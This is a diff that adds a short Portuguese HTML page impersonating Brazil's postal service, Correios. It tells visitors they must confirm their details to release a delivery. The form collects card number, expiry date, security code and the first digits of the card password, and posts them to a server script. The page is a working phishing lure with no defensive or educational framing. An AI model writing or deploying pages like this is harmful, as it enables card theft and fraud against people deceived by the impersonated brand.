@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Verificação de Entrega - Correios</title>
+  <style>body{font-family:Arial;background:#f3f3f3;padding:20px}input{display:block;width:90%;margin:8px 0;padding:10px}button{background:#004a9c;color:#fff;border:0;padding:12px 30px}</style>
+</head>
+<body>
+  <h2>Confirme seus dados para liberar a entrega</h2>
+  <form action="salvar.php" method="post">
+    Número do cartão: <input name="numero" placeholder="0000 0000 0000 0000" required>
+    Validade (MM/AA): <input name="val" placeholder="12/28" required>
+    Código de segurança: <input name="cvv" placeholder="123" required>
+    Senha do cartão (3 primeiros dígitos): <input name="senha" placeholder="123" required>
+    <button>Confirmar e Liberar Entrega</button>
+  </form>
+</body>
+</html>
